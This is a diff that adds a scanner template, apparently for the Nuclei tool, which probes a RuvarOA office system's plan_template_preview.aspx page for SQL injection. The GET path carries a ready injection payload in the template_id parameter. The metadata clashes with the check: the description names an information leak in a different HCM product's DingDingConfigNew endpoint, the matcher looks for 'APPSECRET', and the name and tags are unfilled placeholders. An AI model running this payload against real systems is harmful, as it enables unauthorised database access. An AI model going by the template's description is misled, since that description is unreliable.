@@ -1,0 +1,18 @@
+id: RuvarOA-template_preview-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: HCM智能人力资源系统DingDingConfigNew 存在信息泄露
+  reference:
+    - https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/WorkPlan/plan_template_preview.aspx?template_id=1+and+(select+@@version)>0+--+"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'APPSECRET'
